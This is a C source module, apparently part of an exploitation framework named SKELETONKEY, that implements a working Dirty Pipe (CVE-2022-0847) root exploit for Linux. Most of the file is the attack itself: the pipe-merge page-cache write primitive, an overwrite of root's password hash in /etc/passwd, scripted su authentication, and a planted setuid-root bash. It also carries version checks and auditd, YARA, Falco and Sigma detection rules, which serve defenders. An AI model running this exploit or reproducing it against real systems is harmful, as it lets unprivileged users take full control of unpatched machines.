/*
 * dirty_pipe_cve_2022_0847 — SKELETONKEY module
 *
 * Status: 🟢 WORKING EXPLOIT. Verified out-of-band on Ubuntu 22.04
 * userspace running mainline 5.16.0 (pre-fix): `skeletonkey --exploit
 * dirty_pipe` (uid 1000) lands root and plants a root-owned setuid bash,
 * and /etc/passwd is left byte-identical afterward.
 *
 * Escalation: overwrite root's password field in /etc/passwd's page cache
 * with a known crypt hash (the primitive can't grow the file, so the
 * longer hash clobbers into the following lines — transient), authenticate
 * as root over a pty with the matching password, plant a root-owned proof
 * + setuid bash, then revert the page cache using the Dirty Pipe primitive
 * itself. (The prior code flipped the *caller's* UID to 0000 and ran
 * `su self` — which still demands the caller's password, never rooted
 * anything, and falsely reported OK when su's exec transferred; its revert
 * used drop_caches, which needs root, so it left the running system's
 * /etc/passwd corrupted.) Root is judged only by the out-of-band artifact.
 *
 * Affected kernel ranges:
 *   5.8     ≤ K < 5.17         (mainline fix at 5.17, commit 9d2231c5d74e)
 *   5.15.x: K ≤ 5.15.24        (fixed in 5.15.25)
 *   5.10.x: K ≤ 5.10.101       (fixed in 5.10.102)
 *   5.4.x : not affected (bug introduced in 5.8)
 *
 * Detect logic:
 *   - Parse uname() release into major.minor.patch
 *   - If kernel < 5.8 → SKELETONKEY_OK (bug not introduced yet)
 *   - If kernel is on a branch with a known backport, compare patch
 *     level (above threshold = patched, below = vulnerable)
 *   - If kernel >= 5.17 → SKELETONKEY_OK (mainline fix)
 *   - Otherwise → SKELETONKEY_VULNERABLE
 *
 * Edge case: distros sometimes ship custom-numbered kernels (e.g.
 * Ubuntu's `5.15.0-100-generic` where the .100 is Ubuntu's release
 * counter, NOT the upstream patch level). For now we treat that as
 * an unknown distro backport and report SKELETONKEY_TEST_ERROR with a
 * hint. A future enhancement: parse /proc/version's full string
 * which usually includes the upstream patch level after the distro
 * suffix.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

/* _GNU_SOURCE is passed via -D in the top-level Makefile; do not
 * redefine here (warning: redefined). */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"   /* used inside this block only */
#include "../../core/host.h"
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <pwd.h>

/* ---- Dirty Pipe primitive ---------------------------------------- */

/* Fill the pipe to the brim, then drain — the kernel marks every
 * pipe_buffer slot with PIPE_BUF_FLAG_CAN_MERGE during the fill, and
 * the bug is that this flag SURVIVES the drain. So when we splice() a
 * file page in next, the slot inherits the merge flag and any
 * subsequent write() to the pipe lands in the file's page cache. */
static int prepare_pipe(int p[2])
{
    if (pipe(p) < 0) return -1;
    int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size < 0) pipe_size = 65536;
    static char buf[4096];
    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        ssize_t w = write(p[1], buf, n);
        if (w < 0) return -1;
        r -= w;
    }
    for (int r = pipe_size; r > 0;) {
        int n = r > (int)sizeof(buf) ? (int)sizeof(buf) : r;
        ssize_t rd = read(p[0], buf, n);
        if (rd < 0) return -1;
        r -= rd;
    }
    return 0;
}

/* Write `data_len` bytes into the page cache of `target_path` starting
 * at byte `offset`. Constraints:
 *   - offset must not be page-aligned (Dirty Pipe needs the splice's
 *     1-byte at offset-1 to land in the same page as our write)
 *   - data_len must fit in the page containing `offset`
 *   - target_path must be readable by the caller
 *   - target_path's file size must extend past `offset + data_len`
 *     (Dirty Pipe can't extend files). */
static int dirty_pipe_write(const char *target_path, off_t offset,
                            const char *data, size_t data_len)
{
    if ((offset & 0xfff) == 0) {
        fprintf(stderr, "[-] dirty_pipe_write: offset is page-aligned; refuse\n");
        return -1;
    }
    size_t in_page = 4096 - (offset & 0xfff);
    if (data_len > in_page) {
        fprintf(stderr, "[-] dirty_pipe_write: writes cannot cross page boundary "
                        "(have %zu, fits %zu)\n", data_len, in_page);
        return -1;
    }
    int fd = open(target_path, O_RDONLY);
    if (fd < 0) { perror("open target"); return -1; }

    int p[2];
    if (prepare_pipe(p) < 0) { close(fd); return -1; }

    /* splice 1 byte from `offset - 1` to seed the pipe slot with the
     * file's page (and inherit the stale CAN_MERGE flag). */
    off_t splice_off = offset - 1;
    ssize_t n = splice(fd, &splice_off, p[1], NULL, 1, 0);
    if (n != 1) {
        fprintf(stderr, "[-] splice failed (n=%zd, errno=%d)\n", n, errno);
        close(fd); close(p[0]); close(p[1]); return -1;
    }

    /* Now write our payload. The kernel merges it into the file page. */
    ssize_t w = write(p[1], data, data_len);

    close(fd); close(p[0]); close(p[1]);
    return (w == (ssize_t)data_len) ? 0 : -1;
}

/* ---- /etc/passwd password-field helpers -------------------------- */

/* Locate the byte offset of the password field of `username` in
 * /etc/passwd (the byte immediately after "username:"). Returns true and
 * fills *field_off; also returns the current /etc/passwd size in *sz. */
static bool find_pw_field_offset(const char *username, off_t *field_off, size_t *sz)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return false; }
    buf[st.st_size] = 0;

    size_t ulen = strlen(username);
    char *p = buf;
    while (p < buf + st.st_size) {
        char *eol = strchr(p, '\n');
        if (!eol) eol = buf + st.st_size;
        /* line must start with "username:" */
        if ((p == buf || p[-1] == '\n') &&
            strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
            *field_off = (off_t)((p + ulen + 1) - buf);   /* after "name:" */
            *sz = (size_t)st.st_size;
            free(buf);
            return true;
        }
        p = eol + 1;
    }
    free(buf);
    return false;
}

/* The known root password we install (via a crypt hash written into
 * /etc/passwd's password field) and then authenticate with. Both are
 * transient: the page-cache write is reverted before we return, and
 * Dirty Pipe never touches disk, so nothing survives a cache drop. */
#define DP_ROOT_PW   "skeletonkey"
#define DP_ROOT_HASH "$6$SKpwnSalt1$LNL9WuXFTt8BvutpX4j8/7VpXb3hutSqyZAC.NKfGMx/vg9jGQR/h/cvwgcn55HcaNJipuuiBDsPywanKkx/D1"

/* Run `cmd` as root via `su`, feeding DP_ROOT_PW over a pty (su reads the
 * password from the controlling terminal, not stdin). Returns after su
 * exits; success is judged out-of-band by the caller, never from su's
 * status. */
static void dp_su_root_run(const char *cmd)
{
    int mfd = posix_openpt(O_RDWR | O_NOCTTY);
    if (mfd < 0) return;
    if (grantpt(mfd) < 0 || unlockpt(mfd) < 0) { close(mfd); return; }
    const char *sn = ptsname(mfd);
    if (!sn) { close(mfd); return; }
    char slave[128];
    snprintf(slave, sizeof slave, "%s", sn);

    pid_t pid = fork();
    if (pid < 0) { close(mfd); return; }
    if (pid == 0) {
        setsid();
        int sfd = open(slave, O_RDWR);          /* becomes controlling tty */
        if (sfd < 0) _exit(127);
        dup2(sfd, 0); dup2(sfd, 1); dup2(sfd, 2);
        if (sfd > 2) close(sfd);
        close(mfd);
        execlp("su", "su", "root", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    /* Parent: wait for the "Password:" prompt, then send the password. */
    usleep(400 * 1000);
    char drain[256];
    ssize_t n = read(mfd, drain, sizeof drain);   /* consume the prompt */
    (void)n;
    if (write(mfd, DP_ROOT_PW "\n", sizeof(DP_ROOT_PW)) < 0) { /* ignore */ }
    /* Drain su's output until it exits and the pty closes. */
    for (;;) {
        ssize_t m = read(mfd, drain, sizeof drain);
        if (m <= 0) break;
    }
    int st;
    waitpid(pid, &st, 0);
    close(mfd);
}



/* The bug exists on every kernel from 5.8 (introduction) until the
 * fix is backported to that branch. We model "patched" as:
 *  - on the 5.10 branch: 5.10.102 or later
 *  - on the 5.15 branch: 5.15.25 or later
 *  - any kernel 5.16 or later (mainline fix landed for 5.17, so 5.16
 *    only needs 5.16.11 or later; 5.17+ inherits)
 *  - mainline (≥ 5.17) is patched
 */
static const struct kernel_patched_from dirty_pipe_patched_branches[] = {
    {5, 10,  92},  /* 5.10.x backport (Debian tracker: earlier than 5.10.102) */
    {5, 15,  25},  /* 5.15.x backport */
    {5, 16,  11},  /* 5.16.x backport (mainline fix lived here briefly) */
    {5, 17,   0},  /* mainline fix lands; everything from here is fine */
};

static const struct kernel_range dirty_pipe_range = {
    .patched_from = dirty_pipe_patched_branches,
    .n_patched_from = sizeof(dirty_pipe_patched_branches) /
                      sizeof(dirty_pipe_patched_branches[0]),
};

/* Active sentinel probe: write a known byte into a /tmp probe file
 * via the Dirty Pipe primitive, then re-read to verify the page cache
 * was actually poisoned. This catches the case where /proc/version
 * looks vulnerable (e.g. Debian 5.10.0-30 — apparent version 5.10.30)
 * but the distro silently backported the fix without bumping the
 * upstream version number visible to uname().
 *
 * Side effects: creates and removes a single file under /tmp. No
 * /etc/passwd writes; safe to run from --scan --active. */
static int dirty_pipe_active_probe(void)
{
    char probe_path[] = "/tmp/skeletonkey-dirty-pipe-probe-XXXXXX";
    int fd = mkstemp(probe_path);
    if (fd < 0) return -1;
    const char seed[16] = "ABCDABCDABCDABCD";
    if (write(fd, seed, sizeof seed) != sizeof seed) { close(fd); unlink(probe_path); return -1; }
    fsync(fd);
    close(fd);

    /* Try writing 'X' at offset 4 — well inside the first page, not
     * page-aligned (offset 4 → page-relative offset 4, not 0). */
    int rc = dirty_pipe_write(probe_path, 4, "X", 1);
    if (rc < 0) {
        unlink(probe_path);
        return 0;   /* primitive could not even fire — patched or blocked */
    }

    /* Re-open and read; if the primitive works, byte 4 reads as 'X'.
     * Use O_RDONLY + read, which goes through the page cache (which
     * we just poisoned if the bug is live). */
    fd = open(probe_path, O_RDONLY);
    if (fd < 0) { unlink(probe_path); return -1; }
    char readback[16] = {0};
    ssize_t got = read(fd, readback, sizeof readback);
    close(fd);
    unlink(probe_path);
    if (got < 5) return -1;
    return readback[4] == 'X' ? 1 : 0;
}

static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] dirty_pipe: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 5.8. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 8, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] dirty_pipe: kernel %s predates the bug (introduced in 5.8)\n",
                    v->release);
        }
        return SKELETONKEY_OK;
    }

    bool patched_by_version = kernel_range_is_patched(&dirty_pipe_range, v);

    /* Active probe overrides version-only verdict when requested.
     * The version check is necessary-but-not-sufficient: distros
     * silently backport fixes without bumping the upstream version
     * visible to uname(). The active probe fires the actual primitive
     * and confirms whether it lands. */
    if (ctx->active_probe) {
        if (!ctx->json) {
            fprintf(stderr, "[*] dirty_pipe: running active sentinel probe (safe; /tmp only)\n");
        }
        int probe = dirty_pipe_active_probe();
        if (probe == 1) {
            if (!ctx->json) {
                fprintf(stderr, "[!] dirty_pipe: ACTIVE PROBE CONFIRMED — primitive lands "
                                "(version %s)\n", v->release);
            }
            return SKELETONKEY_VULNERABLE;
        }
        if (probe == 0) {
            if (!ctx->json) {
                fprintf(stderr, "[+] dirty_pipe: active probe sentinel did NOT land — "
                                "primitive blocked (likely patched%s)\n",
                                patched_by_version ? "" : ", or distro silently backported");
            }
            return SKELETONKEY_OK;
        }
        /* probe < 0: probe machinery failed (mkstemp/open/read) — fall
         * back to version-only verdict and report TEST_ERROR caveat */
        if (!ctx->json) {
            fprintf(stderr, "[?] dirty_pipe: active probe machinery failed; "
                            "falling back to version check\n");
        }
    }

    if (patched_by_version) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_pipe: kernel %s is patched (version-only check; "
                            "use --active to confirm empirically)\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] dirty_pipe: kernel %s appears VULNERABLE (version-only check)\n"
                        "    Confirm empirically: re-run with --scan --active\n",
                v->release);
    }
    return SKELETONKEY_VULNERABLE;
}

/* Saved original bytes so cleanup() can re-revert idempotently. */
static char   dp_orig[512];
static off_t  dp_orig_off;
static size_t dp_orig_len;
static bool   dp_wrote;

/* Restore the /etc/passwd page cache to its pre-exploit bytes using the
 * Dirty Pipe primitive itself — NO root and NO drop_caches required (the
 * old code called drop_caches, which fails unprivileged and leaves the
 * running system's passwd corrupted). */
static void dp_revert(void)
{
    if (dp_wrote && dp_orig_len)
        dirty_pipe_write("/etc/passwd", dp_orig_off, dp_orig, dp_orig_len);
}

static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = dirty_pipe_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] dirty_pipe: detect() says not vulnerable; refusing to exploit\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] dirty_pipe: already running as root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Overwrite root's password field with a known crypt hash, then
     * authenticate as root with the matching password. (The previous
     * approach flipped the *caller's* UID to 0000 and ran `su self`,
     * which still demands the caller's password — it never rooted
     * anything and falsely reported OK when su's exec transferred.) */
    off_t field_off;
    size_t pw_sz;
    if (!find_pw_field_offset("root", &field_off, &pw_sz)) {
        fprintf(stderr, "[-] dirty_pipe: could not locate root's password field\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* New root line body written from the password field onward. The
     * hash is longer than the original 'x', so this clobbers into the
     * following lines — harmless and transient (we revert), and su only
     * needs the first (root) line. */
    const char *newline = DP_ROOT_HASH ":0:0:root:/root:/bin/bash\n";
    size_t newlen = strlen(newline);

    if ((field_off & 0xfff) == 0) {
        fprintf(stderr, "[-] dirty_pipe: root password field is page-aligned; "
                        "primitive can't write here\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (newlen > sizeof dp_orig || field_off + (off_t)newlen > (off_t)pw_sz) {
        fprintf(stderr, "[-] dirty_pipe: /etc/passwd too small to hold the payload "
                        "without extending it (Dirty Pipe can't grow files)\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Save the original bytes we're about to clobber, for revert. */
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("open passwd"); return SKELETONKEY_TEST_ERROR; }
    if (pread(fd, dp_orig, newlen, field_off) != (ssize_t)newlen) {
        close(fd); fprintf(stderr, "[-] dirty_pipe: pread backup failed\n");
        return SKELETONKEY_TEST_ERROR;
    }
    close(fd);
    dp_orig_off = field_off; dp_orig_len = newlen;

    /* Unique out-of-band artifacts. */
    long tag = (long)getpid();
    char proof[128], rootbash[128], cmd[1024];
    snprintf(proof,    sizeof proof,    "/tmp/.sk-dirtypipe-%ld.proof",    tag);
    snprintf(rootbash, sizeof rootbash, "/tmp/.sk-dirtypipe-%ld.rootbash", tag);
    unlink(proof); unlink(rootbash);

    if (!ctx->json)
        fprintf(stderr, "[*] dirty_pipe: overwriting root's password field at offset "
                        "%lld (len %zu) via page-cache write\n",
                (long long)field_off, newlen);
    if (dirty_pipe_write("/etc/passwd", field_off, newline, newlen) < 0) {
        fprintf(stderr, "[-] dirty_pipe: page-cache write failed\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    dp_wrote = true;

    /* Authenticate as root with the known password and plant the proof. */
    snprintf(cmd, sizeof cmd,
             "id > %s 2>&1; cp -f /bin/bash %s 2>/dev/null; "
             "chown 0:0 %s %s 2>/dev/null; chmod 4755 %s 2>/dev/null; sync",
             proof, rootbash, rootbash, proof, rootbash);
    if (!ctx->json)
        fprintf(stderr, "[*] dirty_pipe: authenticating as root (su + known password)\n");
    dp_su_root_run(cmd);

    /* Revert the page cache IMMEDIATELY — before we even check the
     * result — so a running system is never left with a known root
     * password. Dirty Pipe never wrote disk, so this fully restores. */
    dp_revert();
    { int ev = open("/etc/passwd", O_RDONLY);   /* nudge a re-read */
      if (ev >= 0) { posix_fadvise(ev, 0, 0, POSIX_FADV_DONTNEED); close(ev); } }

    /* Out-of-band verdict: is the proof a real, root-owned file? */
    struct stat sb;
    bool rooted = (stat(proof, &sb) == 0 && S_ISREG(sb.st_mode) && sb.st_uid == 0);
    if (rooted) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_pipe: ROOT — root-owned proof %s\n", proof);
            fprintf(stderr, "[+] dirty_pipe: setuid-root shell available: %s -p\n", rootbash);
            fprintf(stderr, "[i] dirty_pipe: /etc/passwd page cache reverted (nothing persisted)\n");
        }
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[-] dirty_pipe: no root artifact — honest EXPLOIT_FAIL "
                        "(page cache reverted). The primitive may be blocked, or su/PAM "
                        "rejected the injected hash.\n");
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t dirty_pipe_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[*] dirty_pipe: reverting /etc/passwd page cache + removing artifacts\n");
    dp_revert();                       /* idempotent; no root / no drop_caches needed */
    if (system("rm -f /tmp/.sk-dirtypipe-*.proof /tmp/.sk-dirtypipe-*.rootbash 2>/dev/null") != 0) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: splice() / F_GETPIPE_SZ / posix_fadvise() are
 * Linux-only kernel surface; the Dirty Pipe primitive is structurally
 * unreachable elsewhere. Stub out cleanly so the module still
 * registers and `--list` / `--detect-rules` work on macOS/BSD dev
 * boxes — and so the top-level `make` actually completes there. */
static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] dirty_pipe: Linux-only module "
                "(splice + PIPE_BUF_FLAG_CAN_MERGE) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] dirty_pipe: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_pipe_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* Embedded detection rules — keep the binary self-contained so
 * `skeletonkey --detect-rules --format=auditd` works without a separate
 * data-dir install. */
static const char dirty_pipe_auditd[] =
    "# Dirty Pipe (CVE-2022-0847) — auditd detection rules\n"
    "# See modules/dirty_pipe_cve_2022_0847/detect/auditd.rules for full version.\n"
    "-w /etc/passwd    -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/shadow    -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/sudoers   -p wa -k skeletonkey-dirty-pipe\n"
    "-w /etc/sudoers.d -p wa -k skeletonkey-dirty-pipe\n"
    "-a always,exit -F arch=b64 -S splice -k skeletonkey-dirty-pipe-splice\n"
    "-a always,exit -F arch=b32 -S splice -k skeletonkey-dirty-pipe-splice\n";

static const char dirty_pipe_yara[] =
    "rule dirty_pipe_passwd_uid_flip : cve_2022_0847 page_cache_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2022-0847\"\n"
    "        description = \"Dirty Pipe (CVE-2022-0847): /etc/passwd page-cache UID flip — non-root username remapped to UID 0000+. Scan /etc/passwd directly; legitimate root entries use '0:', never '0000:'.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $uid_flip = /\\n[a-z_][a-z0-9_-]{0,30}:[^:]{0,8}:0{4,}:[0-9]+:/\n"
    "    condition:\n"
    "        $uid_flip\n"
    "}\n";

static const char dirty_pipe_falco[] =
    "- rule: Dirty Pipe splice from setuid/sensitive file by non-root\n"
    "  desc: |\n"
    "    A non-root process calls splice() with a fd pointing at a\n"
    "    setuid-root binary or a credential file. The Dirty Pipe\n"
    "    primitive (CVE-2022-0847) splices 1 byte from the target to\n"
    "    a prepared pipe to inherit the stale PIPE_BUF_FLAG_CAN_MERGE,\n"
    "    then writes attacker bytes that land in the file's page cache.\n"
    "  condition: >\n"
    "    evt.type = splice and not user.uid = 0 and\n"
    "    (fd.name in (/etc/passwd, /etc/shadow, /etc/sudoers)\n"
    "     or fd.name startswith /usr/bin/su\n"
    "     or fd.name startswith /usr/bin/passwd\n"
    "     or fd.name startswith /bin/su)\n"
    "  output: >\n"
    "    Dirty Pipe-style splice from sensitive file by non-root\n"
    "    (user=%user.name proc=%proc.name fd=%fd.name pid=%proc.pid)\n"
    "  priority: CRITICAL\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2022.0847]\n";

static const char dirty_pipe_sigma[] =
    "title: Possible Dirty Pipe exploitation (CVE-2022-0847)\n"
    "id: f6b13c08-skeletonkey-dirty-pipe\n"
    "status: experimental\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  modification:\n"
    "    type: 'PATH'\n"
    "    name|startswith: ['/etc/passwd', '/etc/shadow', '/etc/sudoers']\n"
    "  not_root:\n"
    "    auid|expression: '!= 0'\n"
    "  condition: modification and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2022.0847]\n";

const struct skeletonkey_module dirty_pipe_module = {
    .name           = "dirty_pipe",
    .cve            = "CVE-2022-0847",
    .summary        = "pipe_buffer CAN_MERGE flag inheritance → page-cache write",
    .family         = "dirty_pipe",
    .kernel_range   = "5.8 ≤ K, fixed mainline 5.17, backports: 5.10.102 / 5.15.25 / 5.16.11",
    .detect         = dirty_pipe_detect,
    .exploit        = dirty_pipe_exploit,
    .mitigate       = NULL,
    .cleanup        = dirty_pipe_cleanup,
    .detect_auditd  = dirty_pipe_auditd,
    .detect_sigma   = dirty_pipe_sigma,
    .detect_yara    = dirty_pipe_yara,
    .detect_falco   = dirty_pipe_falco,
    .opsec_notes    = "Creates a pipe, fills+drains to leave PIPE_BUF_FLAG_CAN_MERGE on every slot; splice(1 byte) from (target_offset-1) on /etc/passwd to inherit the stale flag, then write(pipe) so the payload merges into the file's page cache. Overwrites root's password field with a known crypt hash (clobbers into following lines transiently), authenticates as root over a pty via su, plants a root-owned proof + setuid bash under /tmp, then reverts the page cache by writing the original bytes back through the same primitive (no root / no drop_caches needed — nothing persists; Dirty Pipe never wrote disk). Offset must be non-page-aligned and each write must fit a single page. Very audit-visible: splice(fd=/etc/passwd) + write from a non-root process, then su spawning as root. --active mode writes/reads /tmp/skeletonkey-dirty-pipe-probe-XXXXXX to confirm the primitive. cleanup() re-reverts idempotently and removes the /tmp artifacts.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_dirty_pipe(void)
{
    skeletonkey_register(&dirty_pipe_module);
}
